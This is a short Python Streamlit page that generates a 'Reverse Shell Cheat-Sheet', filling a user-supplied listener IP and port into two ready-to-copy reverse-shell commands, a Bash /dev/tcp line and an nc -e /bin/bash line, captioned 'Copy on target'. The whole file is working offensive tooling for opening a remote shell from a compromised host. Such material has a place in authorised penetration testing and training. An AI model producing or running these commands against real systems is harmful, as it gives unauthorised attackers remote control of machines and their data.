import streamlit as st

SHELLS = {"Bash":"bash -i >& /dev/tcp/{ip}/{port} 0>&1", "NC":"nc {ip} {port} -e /bin/bash"}

def render():
    st.header("🪝 Reverse Shell Cheat-Sheet")
    [tab] = st.tabs(["Cheat-Sheet"])
    with tab:
        ip = st.text_input("Listener IP","127.0.0.1")
        port = st.text_input("Port","9001")
        st.caption("Copy on target:")
        for name, tpl in SHELLS.items(): st.code(tpl.format(ip=ip,port=port))